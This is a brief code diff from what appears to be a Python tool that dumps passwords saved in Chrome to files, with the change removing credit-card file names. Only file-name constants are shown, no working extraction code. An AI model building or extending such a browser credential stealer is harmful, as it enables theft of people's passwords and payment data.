@@ -15,10 +15,7 @@ import subprocess
 from contextlib import closing
 
 file0 = "chrome_passwords.txt"  # File to store Chrome plain passwords
-# File to store Chrome plain credit cards information
-file1 = "chrome_credit_cards.txt"
 file2 = "chrome_login.db"  # File to store Chrome encrypted passwords
-file3 = "chrome_credit_cards.db"  # File to store Chrome encrypted credit cards
 
 OS = [
     {
